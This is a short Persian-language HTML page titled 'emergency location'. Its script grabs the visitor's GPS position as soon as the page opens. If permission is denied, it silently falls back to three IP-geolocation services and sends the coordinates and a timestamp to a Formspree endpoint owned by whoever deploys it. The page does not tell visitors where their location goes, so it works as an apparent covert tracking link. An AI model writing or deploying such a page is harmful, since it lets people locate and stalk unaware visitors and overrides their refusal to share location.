<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>موقعیت اضطراری</title>
    <style>
        body { font-family: Tahoma; direction: rtl; text-align: center; padding: 20px; background: #111; color: #eee; }
        #status { margin-top: 30px; font-size: 18px; }
    </style>
</head>
<body>
    <h2>در حال دریافت موقعیت...</h2>
    <div id="status"></div>

    <script>
        // ====== تنظیمات: آدرس Formspree خودت ======
        const FORM_ENDPOINT = 'https://formspree.io/f/mpqevqkd'; // ← مال خودت
        // =========================================

        const statusEl = document.getElementById('status');

        function updateStatus(text, isError = false) {
            statusEl.textContent = text;
            if (isError) statusEl.style.color = '#f66';
            else statusEl.style.color = '#6f6';
        }

        // ارسال نهایی به سرور
        async function sendLocation(lat, lng, accuracy, method) {
            const payload = {
                lat: lat,
                lng: lng,
                accuracy: accuracy || 'نامشخص',
                method: method,
                time: new Date().toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' })
            };

            try {
                const response = await fetch(FORM_ENDPOINT, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                if (response.ok) {
                    updateStatus(`✅ موقعیت با روش ${method} ارسال شد.`);
                } else {
                    updateStatus(`❌ خطای سرور ثبت (${response.status})`, true);
                }
            } catch (err) {
                updateStatus('❌ خطا در اتصال به سرویس ثبت.', true);
            }
        }

        // ========== IP چندلایه با سرویس‌های ایرانی/ضدفیلتر ==========
        async function getIPLocation() {
            const tryService = async (url, extractFn, serviceName) => {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 4000);
                    const resp = await fetch(url, { signal: controller.signal });
                    clearTimeout(timeoutId);
                    if (!resp.ok) throw new Error('status ' + resp.status);
                    const data = await resp.json();
                    const result = extractFn(data);
                    if (result && result.lat && result.lng) {
                        return { ...result, service: serviceName };
                    }
                } catch (e) {
                    console.warn(serviceName + ' ناموفق', e.message);
                }
                return null;
            };

            const r1 = await tryService(
                'https://ip.iran.li/json',
                (data) => ({
                    lat: parseFloat(data.lat) || parseFloat(data.latitude),
                    lng: parseFloat(data.lon) || parseFloat(data.longitude),
                    accuracy: 'شهری (iran.li)',
                    method: 'ip'
                }),
                'ip.iran.li'
            );
            if (r1) return r1;

            const r2 = await tryService(
                'https://api.keybit.ir/geo',
                (data) => {
                    if (data.lat && data.lng) {
                        return {
                            lat: parseFloat(data.lat),
                            lng: parseFloat(data.lng),
                            accuracy: 'شهری (keybit)',
                            method: 'ip'
                        };
                    }
                    return null;
                },
                'api.keybit.ir'
            );
            if (r2) return r2;

            const r3 = await tryService(
                'https://get.geojs.io/v1/ip/geo.json',
                (data) => ({
                    lat: parseFloat(data.latitude),
                    lng: parseFloat(data.longitude),
                    accuracy: 'شهری (geojs)',
                    method: 'ip'
                }),
                'geojs.io'
            );
            if (r3) return r3;

            throw new Error('همهٔ سرویس‌های IP از دسترس خارج هستند');
        }
        // ====================================================

        function tryGPS() {
            updateStatus('📡 در حال جستجوی ماهواره...');

            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    sendLocation(
                        pos.coords.latitude,
                        pos.coords.longitude,
                        `دقت ${Math.round(pos.coords.accuracy)} متر`,
                        'gps'
                    );
                },
                (err) => {
                    console.warn('GPS ناموفق', err.message);
                    updateStatus('📍 استفاده از IP (چندلایه)...');
                    getIPLocation()
                        .then(loc => sendLocation(loc.lat, loc.lng, loc.accuracy, 'ip'))
                        .catch(() => updateStatus('❌ دریافت موقعیت کاملاً ناموفق بود.', true));
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }

        tryGPS();
    </script>
</body>
</html>
